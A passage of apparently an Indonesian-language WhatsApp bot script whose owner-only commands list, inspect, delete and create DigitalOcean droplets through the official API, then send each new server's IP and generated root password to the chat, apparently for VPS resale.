if (!dropletId) return reply('ID droplet belum diberikan!');
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${apido}`
}
});

if (response.ok) {
reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
break;
}

case 'cekdroplet': {
if (!isOwner) return onlyOwn()
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan!');
const getDropletInfo = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
const response = await fetch(apiUrl, {
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${apido}`
}
});
if (response.ok) {
const data = await response.json();
const droplet = data.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
const vpsRam = droplet.memory / 1024;
return {
dropletid: droplet.id,
username: droplet.name,
ip: ipAddress,
ram: `${vpsRam} GB`,
os: droplet.image.distribution,
cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
storage: droplet.disk,
status: droplet.status // Menambahkan status VPS
};
} else {
const errorData = await response.json();
return new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
}
} catch (err) {
reply('Terjadi kesalahan saat memeriksa detail droplet:', err.message);
return new Error('Terjadi kesalahan saat memeriksa detail droplet.');
}
};

getDropletInfo(dropletId)
.then((info) => {
let textku = `*DETAIL VPS KAMU*
Droplet ID: ${info.dropletid}
Hostname: ${info.username}
IPv4: ${info.ip}
Ram: ${info.ram}
OS: ${info.os}
CPU: ${info.cpu}
Storage: ${info.storage}
Status: ${info.status}`;
rafatharcode.sendMessage(m.chat, { text: textku });
})
.catch((err) => {
reply(err);
rafatharcode.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
});
break;
}

case 'listdroplet': {
if (!isOwner) return onlyOwn()
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + apido
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
rafatharcode.sendMessage(m.chat, { text: mesej });
});
} catch (err) {
reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}

break;
}

case 'vps1g1c': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'sgp1',
size: 's-1vcpu-1gb',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
// Memeriksa apakah ada alamat IP VPS yang tersedia
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

let messageText = `VPS berhasil dibuat!\n\n`;

messageText += `ID: ${dropletId}\n`;
messageText += `IP VPS: ${ipVPS}\n`;
messageText += `Password: ${password}\n`;

await rafatharcode.sendMessage(m.chat, { text: messageText });
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'vps1g1c-v2': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'sgp1',
size: 's-1vcpu-1gb',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
// Memeriksa apakah ada alamat IP VPS yang tersedia
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

var teks = ` *BERIKUT DATA VPS ANDA✅*
*ID VPS :* ${dropletId}\n
*IP VPS :* ${ipVPS}\n
*PW VPS :* ${password}
*NOTE :*
*SIMPAN DATA VPS ANDA DENGAN BAIK JIKA INGIN DAPAT GARANSI WAJIB BAWA DATA VPS + BUKTI TRX TERIMAKASIH😁✌🏻*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY IP VPS\",\"id\":\"123456789\",\"copy_code\":\"${ipVPS}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY PW VPS\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'vps2g1c': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'sgp1',
size: 's-1vcpu-2gb',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
// Memeriksa apakah ada alamat IP VPS yang tersedia
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

let messageText = `VPS berhasil dibuat!\n\n`;

messageText += `ID: ${dropletId}\n`;
messageText += `IP VPS: ${ipVPS}\n`;
messageText += `Password: ${password}\n`;

await rafatharcode.sendMessage(m.chat, { text: messageText });
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break
 
case 'vps2g1c-v2': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'sgp1',
size: 's-1vcpu-2gb',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
// Memeriksa apakah ada alamat IP VPS yang tersedia
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

var teks = ` *BERIKUT DATA VPS ANDA✅*
*ID VPS :* ${dropletId}\n
*IP VPS :* ${ipVPS}\n
*PW VPS :* ${password}
*NOTE :*
*SIMPAN DATA VPS ANDA DENGAN BAIK JIKA INGIN DAPAT GARANSI WAJIB BAWA DATA VPS + BUKTI TRX TERIMAKASIH😁✌🏻*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY IP VPS\",\"id\":\"123456789\",\"copy_code\":\"${ipVPS}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY PW VPS\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'vps2g2c': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'sgp1',
size: 's-2vcpu-2gb',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
// Memeriksa apakah ada alamat IP VPS yang tersedia
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

let messageText = `VPS berhasil dibuat!\n\n`;

messageText += `ID: ${dropletId}\n`;
messageText += `IP VPS: ${ipVPS}\n`;
messageText += `Password: ${password}\n`;

await rafatharcode.sendMessage(m.chat, { text: messageText });
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'vps2g2c-v2': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'sgp1',
size: 's-2vcpu-2gb',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
// Memeriksa apakah ada alamat IP VPS yang tersedia
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

var teks = ` *BERIKUT DATA VPS ANDA✅*
*ID VPS :* ${dropletId}\n
*IP VPS :* ${ipVPS}\n
*PW VPS :* ${password}
*NOTE :*
*SIMPAN DATA VPS ANDA DENGAN BAIK JIKA INGIN DAPAT GARANSI WAJIB BAWA DATA VPS + BUKTI TRX TERIMAKASIH😁✌🏻*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY IP VPS\",\"id\":\"123456789\",\"copy_code\":\"${ipVPS}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY PW VPS\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'vps4g2c': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'sgp1',
size: 's-2vcpu-4gb',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
// Memeriksa apakah ada alamat IP VPS yang tersedia
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

let messageText = `VPS berhasil dibuat!\n\n`;

messageText += `ID: ${dropletId}\n`;
messageText += `IP VPS: ${ipVPS}\n`;
messageText += `Password: ${password}\n`;

await rafatharcode.sendMessage(m.chat, { text: messageText });
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'vps4g2c-v2': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'sgp1',
size: 's-2vcpu-4gb',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
// Memeriksa apakah ada alamat IP VPS yang tersedia
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

var teks = ` *BERIKUT DATA VPS ANDA✅*
*ID VPS :* ${dropletId}\n
*IP VPS :* ${ipVPS}\n
*PW VPS :* ${password}
*NOTE :*
*SIMPAN DATA VPS ANDA DENGAN BAIK JIKA INGIN DAPAT GARANSI WAJIB BAWA DATA VPS + BUKTI TRX TERIMAKASIH😁✌🏻*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY IP VPS\",\"id\":\"123456789\",\"copy_code\":\"${ipVPS}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY PW VPS\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'vps8g4c': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'sgp1',
size: 's-4vcpu-8gb',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

let messageText = `VPS berhasil dibuat!\n\n`;
messageText += `ID: ${dropletId}\n`;
messageText += `IP VPS: ${ipVPS}\n`;
messageText += `Password: ${password}\n`;

await rafatharcode.sendMessage(m.chat, { text: messageText });
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'vps8g4c-v2': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'sgp1',
size: 's-4vcpu-8gb',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
// Memeriksa apakah ada alamat IP VPS yang tersedia
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

var teks = ` *BERIKUT DATA VPS ANDA✅*
*ID VPS :* ${dropletId}\n
*IP VPS :* ${ipVPS}\n
*PW VPS :* ${password}
*NOTE :*
*SIMPAN DATA VPS ANDA DENGAN BAIK JIKA INGIN DAPAT GARANSI WAJIB BAWA DATA VPS + BUKTI TRX TERIMAKASIH😁✌🏻*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY IP VPS\",\"id\":\"123456789\",\"copy_code\":\"${ipVPS}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY PW VPS\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'vps16g4c': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'nyc3',
size: 's-4vcpu-16gb-amd',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

let messageText = `VPS berhasil dibuat!\n\n`;
messageText += `ID: ${dropletId}\n`;
messageText += `IP VPS: ${ipVPS}\n`;
messageText += `Password: ${password}\n`;

await rafatharcode.sendMessage(m.chat, { text: messageText });
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'vps16g4c-v2': {
if (!isOwner) return onlyOwn()
let hostname = args[0];
if (!hostname) return reply('Masukkan hostname VPS nya!');

try {
let dropletData = {
name: hostname,
region: 'nyc3',
size: 's-4vcpu-16gb-amd',
image: 'ubuntu-20-04-x64',
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

let password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
},
body: JSON.stringify(dropletData)
});

let responseData = await response.json();

if (response.ok) {
let dropletConfig = responseData.droplet;
let dropletId = dropletConfig.id;

// Menunggu hingga VPS selesai dibuat
reply(`Tunggu Sebentar...`);
await new Promise(resolve => setTimeout(resolve, 60000));

// Mengambil informasi lengkap tentang VPS
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + apido
}
});

let dropletData = await dropletResponse.json();
// Memeriksa apakah ada alamat IP VPS yang tersedia
let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

var teks = ` *BERIKUT DATA VPS ANDA✅*
*ID VPS :* ${dropletId}\n
*IP VPS :* ${ipVPS}\n
*PW VPS :* ${password}
*NOTE :*
